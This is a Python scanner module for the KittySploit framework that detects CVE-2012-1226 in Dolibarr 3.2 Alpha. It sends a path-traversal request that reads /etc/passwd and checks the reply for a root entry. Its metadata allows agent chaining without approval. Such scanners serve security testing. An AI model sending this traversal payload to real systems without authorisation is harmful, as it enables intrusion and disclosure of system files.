#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple directory traversal vulnerabilities in Dolibarr CMS 3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Dolibarr ERP/CRM 3.2 Alpha - Multiple Directory Traversal Vulnerabilities Detection',
        'description': 'Multiple directory traversal vulnerabilities in Dolibarr CMS 3.2.0 Alpha allow remote attackers to read arbitrary files and possibly execute arbitrary code via a .. (dot dot) in the (1) file parameter to document.php or (2) backtopage parameter in a create action to comm/action/fiche.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2012', 'lfi', 'dolibarr', 'traversal', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/36873',
            'https://nvd.nist.gov/vuln/detail/CVE-2012-1226',
            'http://www.vulnerability-lab.com/get_content.php?id=428',
            'http://www.exploit-db.com/exploits/18480',
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/73136',
        ],
        'cve': 'CVE-2012-1226',
    }

    def run(self):
        r = self.http_request(method="GET", path='/document.php?modulepart=project&file=../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Dolibarr ERP/CRM 3.2 Alpha - Multiple Directory Traversal Vulnerabilities detected",
                path='/document.php?modulepart=project&file=../../../../../../../etc/passwd',
            )
            return True
        return False

